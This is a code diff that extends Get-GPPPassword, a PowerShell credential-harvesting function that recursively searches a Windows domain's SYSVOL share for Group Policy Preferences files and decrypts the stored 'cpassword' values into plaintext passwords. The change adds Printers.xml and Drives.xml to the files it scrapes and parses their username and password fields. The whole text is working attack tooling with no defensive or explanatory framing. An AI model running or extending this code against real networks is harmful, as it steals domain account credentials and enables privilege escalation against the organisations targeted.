@@ -67,7 +67,7 @@ function Get-GPPPassword {
     }
     
     #discover potential files containing passwords ; not complaining in case of denied access to a directory
-    $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml'
+    $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
     
     if ( -not $XMlFiles )
     {
@@ -116,7 +116,19 @@ function Get-GPPPassword {
                     $UserName = $Xml.DataSources.DataSource.Properties.username
                     $Changed = $Xml.DataSources.DataSource.changed
                 }
-            }
+				
+				'Printers.xml' {
+                    $Cpassword = $Xml.Printers.SharedPrinter.Properties.cpassword
+                    $UserName = $Xml.Printers.SharedPrinter.Properties.username
+                    $Changed = $Xml.Printers.SharedPrinter.changed
+                }
+				
+				'Drives.xml' {
+                    $Cpassword = $Xml.Drives.Drive.Properties.cpassword
+                    $UserName = $Xml.Drives.Drive.Properties.username
+                    $Changed = $Xml.Drives.Drive.changed
+                }
+			}
 
             if ($Cpassword) {$Password = Get-DecryptedCpassword $Cpassword}
 
